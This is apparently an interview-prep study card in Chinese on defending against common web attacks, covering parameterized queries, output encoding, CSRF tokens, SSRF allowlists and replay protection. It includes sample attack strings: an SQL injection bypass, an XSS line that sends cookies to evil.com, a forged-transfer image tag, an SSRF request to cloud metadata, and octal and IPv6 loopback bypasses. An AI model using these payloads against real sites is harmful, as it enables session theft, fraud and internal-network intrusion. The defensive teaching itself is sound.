---
id: scen-065
difficulty: L2
category: scenario
subcategory: 安全与风控
tags:
- Web安全
- SQL注入
- XSS
- CSRF
- SSRF
- 越权
- WAF
- 渗透测试
feynman:
  essence: 构建多层防御体系，拦截常见的Web恶意攻击。
  analogy: 像城堡安保，门口查证件（认证），墙头防翻越（防注入），窗户装栅栏（防XSS）。
  first_principle: 如何在不可信的网络输入和用户行为面前保障系统安全？
  key_points:
  - 防SQL注入：参数化查询，不用字符串拼接
  - 防XSS：输入过滤，输出HTML编码
  - 防CSRF：Token校验，SameSite Cookie
  - 防越权：接口级权限校验，不信任客户端数据
follow_up:
- 如何防止水平越权？
- CSP如何配置？
- OWASP Top 10有哪些？
memory_points:
- SQL注入：因拼接SQL有风险，故强用参数化查询与ORM井号占位符。
- XSS防御：输出做HTML实体编码，配HttpOnly防窃取与CSP限制外部脚本加载。
- CSRF防范：因恶意网站可伪造请求，故表单加Token或设SameSite=Strict/Lax。
- SSRF防御：后端发请求需配URL白名单，且必须校验解析后的IP防内网穿透。
- 越权与重放：接口强校验归属权限防越权，用时间戳加Nonce防请求重放。
---

# 如何防范常见的Web安全攻击？SQL注入/XSS/CSRF/SSRF等。

【常见Web攻击及防御】

【1. SQL注入】
攻击：`' OR 1=1 --` 绕过验证
防御：
- 参数化查询
- ORM框架（MyBatis #{} 而非 ${}）
- 最小权限（DB账号不给DDL权限）
- WAF规则

【2. XSS（跨站脚本）】
攻击：在页面注入恶意JS
```
// 反射型：<script>fetch('evil.com?cookie='+document.cookie)</script>
// 存储型：评论中存恶意脚本
```
防御：
- 输出编码：HTML实体编码（< → &lt;）
- CSP（Content-Security-Policy）：限制脚本来源
- HttpOnly Cookie：JS无法读取Cookie
- 输入校验：过滤特殊字符

【3. CSRF（跨站请求伪造）】
攻击：诱导用户在已登录状态下发起请求
```
<img src="bank.com/transfer?to=hacker&amount=10000">
```
防御：
- CSRF Token：表单携带随机Token
- SameSite Cookie：SameSite=Strict/Lax
- Referer检查
- 关键操作二次确认

【4. SSRF（服务端请求伪造）】
攻击：利用服务端发起请求访问内网
```
url=http://169.254.169.254/latest/meta-data/  # 云服务器元数据
```
防御：
- URL白名单：只允许特定域名
- 禁止访问内网IP段（10.x/172.x/192.168.x）
- DNS Pinning：防止DNS重绑定

【5. 点击劫持】
攻击：透明iframe覆盖诱导点击
防御：
- X-Frame-Options: DENY
- CSP frame-ancestors

【6. 文件上传漏洞】
攻击：上传恶意文件（如.php webshell）
防御：
- 文件类型白名单
- 文件重命名
- 存储与Web服务器分离
- 病毒扫描

【7. 越权访问】
- 水平越权：用户A访问用户B的数据
- 垂直越权：普通用户访问管理员接口
防御：
- 每个接口校验权限
- 数据查询加userId条件
- RBAC权限模型

【8. 重放攻击】
攻击：截获请求重新发送
防御：
- Nonce（一次性随机数）
- 时间戳 + 有效期
- 请求签名

【CSRF 攻击原理示意图】
```
    用户浏览器 (已登录 Bank.com)
       │
       │ 1. 用户访问恶意网站 Evil.com
       ▼
┌──────────────────┐
│   Evil.com 页面  │
│  <img src=       │
│  "bank.com/..." │
└────────┬─────────┘
         │
         │ 2. 浏览器自动携带 Cookie
         │    发起 GET/POST 请求
         ▼
┌──────────────────┐
│   Bank.com 服务器 │
│   (认为是用户本人)│
│   执行转账操作    │
└──────────────────┘
```

【安全开发生命周期】
- 设计阶段：威胁建模
- 开发阶段：安全编码规范
- 测试阶段：SAST/DAST扫描
- 上线前：渗透测试
- 运行时：WAF + 监控

## 常见考点
1. **SQL注入绕过**：如果使用了 PreparedStatement 就一定安全吗？（答：若在 SQL 拼接中直接使用了表名、列名或 Order By 的参数（占位符不能替代标识符），仍可能注入。需使用白名单校验标识符）
2. **XSS 防御细节**：CSP（Content Security Policy）具体怎么配置？（答：`Content-Security-Policy: default-src 'self'; script-src 'self' trusted.cdn.com; object-src 'none';` 禁止内联脚本和外部未知资源加载）
3. **SameSite Cookie 属性**：Lax 和 Strict 的区别？（答：Strict 禁止所有跨站 Cookie 发送；Lax 允许部分安全请求（如 Get 链接跳转）发送 Cookie，平衡了安全与用户体验。Chrome 默认设为 Lax）
4. **SSRF 绕过内网检测**：攻击者可能会用 `http://0177.0.0.1` (8进制) 或 `http://[::]` (IPv6) 代替 127.0.0.1，如何防御？（答：必须将输入的 URL 域名解析为 IP 地址，然后将 IP 地址转换为标准的长整型数值进行范围比对，直接拦截私有网段）


## 记忆要点

- SQL注入：因拼接SQL有风险，故强用参数化查询与ORM井号占位符。
- XSS防御：输出做HTML实体编码，配HttpOnly防窃取与CSP限制外部脚本加载。
- CSRF防范：因恶意网站可伪造请求，故表单加Token或设SameSite=Strict/Lax。
- SSRF防御：后端发请求需配URL白名单，且必须校验解析后的IP防内网穿透。
- 越权与重放：接口强校验归属权限防越权，用时间戳加Nonce防请求重放。

## 结构化回答

**30 秒电梯演讲：** 构建多层防御体系，拦截常见的Web恶意攻击。打比方——像城堡安保，门口查证件(认证)，墙头防翻越(防注入)，窗户装栅栏(防XSS)。落到工程上，参数化查询，不用字符串拼接。

**展开框架：**
1. **防SQL注入** — 参数化查询，不用字符串拼接
2. **防XSS** — 输入过滤，输出HTML编码
3. **防CSRF** — Token校验，SameSite Cookie

**收尾：** 这几个点都能配合实战展开。您想继续聊哪个追问——比如 「如何防止水平越权」 或者 「CSP如何配置」？

## 视频脚本

> 预计时长：2 分钟 | 由浅入深

| 时间 | 画面/字幕 | 口播台词 | 讲解要点 |
|------|----------|----------|----------|
| 0:00 | 标题卡：防范常见的Web安全攻击 | "防范常见的Web安全攻击，一分钟讲透。" | 开场钩子 |
| 0:35 | 生活类比动画 | "打个比方——像城堡安保，门口查证件(认证)，墙头防翻越(防注入)，窗户装栅栏(防XSS)。" | 核心类比 |
| 1:10 | 概念定义动画 | "一句话：构建多层防御体系，拦截常见的Web恶意攻击。" | 核心定义 |
| 1:50 | 防SQL注入 图解 | "参数化查询，不用字符串拼接。" | 防SQL注入 |
